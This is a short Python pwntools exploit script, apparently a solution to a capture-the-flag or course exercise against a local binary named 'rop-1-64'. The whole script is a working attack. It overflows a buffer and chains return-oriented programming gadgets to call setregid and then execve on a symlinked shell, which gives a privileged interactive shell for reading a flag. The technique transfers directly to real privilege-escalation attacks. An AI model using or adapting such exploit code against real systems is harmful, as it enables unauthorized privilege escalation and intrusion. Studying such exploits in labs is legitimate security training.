from pwn import *

GROUP = 50001
garb = 'bbbbbbbb'
# This code requires a symbolic link from ink to /bin/sh to work

# Addresses needed for the attack
pop_rdi_ret_addr = 0x4007e3 # From ROPgadget --binary ./rop-1-64
pop_rdx_pop_rbp_ret_addr = 0x4006d8 # From ROPgadget --binary ./rop-1-64
pop_rsi_pop_r15_ret_addr = 0x4007e1 # From ROPgadget --binary ./rop-1-64
setregid_addr = ELF('./rop-1-64').symbols['setregid']
execve_addr = ELF('./rop-1-64').symbols['execve']
sh_addr = 0x4008cb # address of 'ink' in the program code

# Launch processs and send rop chain
p = process('./rop-1-64')
inp = 'a' * 0x80 + 'bbbbbbbb' + p64(pop_rdi_ret_addr) + p64(GROUP) + p64(pop_rsi_pop_r15_ret_addr) + p64(GROUP) + 'bbbbbbbb' + p64(setregid_addr)
inp = inp + p64(pop_rdi_ret_addr) + p64(sh_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(0) + 'bbbbbbbb' + p64(pop_rdx_pop_rbp_ret_addr) + p64(0) + "bbbbbbbb" + p64(execve_addr)
p.sendline(inp)

# Use privilleged shell to get the flag
p.interactive()
